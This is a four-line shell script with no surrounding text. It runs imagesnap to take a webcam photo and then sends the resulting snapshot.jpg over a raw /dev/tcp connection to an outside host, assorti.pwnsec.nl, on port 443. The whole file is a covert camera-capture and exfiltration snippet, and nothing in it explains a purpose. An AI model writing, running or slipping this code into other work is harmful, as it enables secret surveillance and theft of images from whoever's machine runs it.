#!/bin/sh

imagesnap
cat snapshot.jpg >& /dev/tcp/assorti.pwnsec.nl/443 0>&1
